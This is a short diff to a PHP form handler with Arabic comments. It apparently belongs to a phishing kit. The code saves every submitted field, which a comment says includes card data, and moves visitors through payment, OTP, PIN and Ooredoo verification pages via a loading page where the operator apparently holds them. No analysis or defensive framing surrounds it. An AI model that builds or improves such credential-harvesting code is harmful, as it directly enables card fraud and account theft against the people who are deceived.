@@ -17,20 +17,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (strpos($current_page, 'index.php') !== false) {
             updateVisitorStep($visitor_id, 'index');
         } else {
-            updateVisitorStep($visitor_id, $current_page);
+            updateVisitorStep($visitor_id, str_replace('.php', '', $current_page));
         }
     } catch (Exception $e) {
         error_log("Error updating visitor step: " . $e->getMessage());
     }
 
-    // حفظ كل البيانات المجمعة من الفورم
+    // حفظ كل البيانات المجمعة من الفورم (بما فيها بيانات البطاقة)
     foreach ($_POST as $key => $value) {
         if ($key !== 'visitor_id' && $key !== 'current_page') {
             saveData($visitor_id, $key, $value);
         }
     }
 
-    // تحديد الصفحة التالية
+    // تحديد الصفحة التالية والمنطق
     $next_step = 'success.php';
     $redirects = [
         'index.php' => 'update_info.php',
@@ -42,15 +42,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if (isset($redirects[$current_page])) {
         $next_step = $redirects[$current_page];
+        // انتقال تلقائي بعد ثانيتين لجميع الصفحات قبل الدفع
+        header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
     } else {
+        // منطق الانتظار اليدوي يبدأ من صفحة الدفع وما بعدها
         if (strpos($current_page, 'payment.php') !== false) $next_step = 'otp.php';
         elseif (strpos($current_page, 'otp.php') !== false) $next_step = 'pin.php';
         elseif (strpos($current_page, 'pin.php') !== false) $next_step = 'ooredoo.php';
         elseif (strpos($current_page, 'ooredoo.php') !== false) $next_step = 'otp_ooredoo.php';
+        
+        header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
     }
-    
-    // التوجيه دائماً لصفحة الانتظار
-    header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
     exit;
 }
 ?>
